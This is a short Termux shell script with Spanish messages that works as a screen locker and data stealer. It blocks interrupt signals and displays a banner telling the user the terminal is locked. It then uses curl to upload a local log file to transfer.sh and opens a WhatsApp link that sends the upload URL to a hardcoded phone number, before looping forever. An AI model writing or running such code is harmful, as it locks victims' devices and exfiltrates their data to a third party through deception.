clear
setterm --foreground red
trap '' INT TSTP 
echo "
 ________   ________     _______     
|\   __  \ |\   ___ \   /  ___  \    
\ \  \|\  \\ \  \_|\ \ /__/|_/  /|   
 \ \   __  \\ \  \ \\ \|__|//  / /   
  \ \  \|\  \\ \  \_\\ \   /  /_/__  
   \ \_______\\ \_______\ |\________\ "
echo "    \|_______| \|_______|  \|_______|"

setterm --foreground green
   echo "Su terminal esta bloqueada"
   echo "para desbloquearla envia el siguiente link al numero correspondiente"
link=$(curl -s --upload-file /data/data/com.termux/files/home/whats-code/log.txt  https://transfer.sh/JKsuh8)

open https://wa.me/59822228768?text=$link.KeLSxs9dj
fun () {
  sleep 24h
  fun
}
fun 
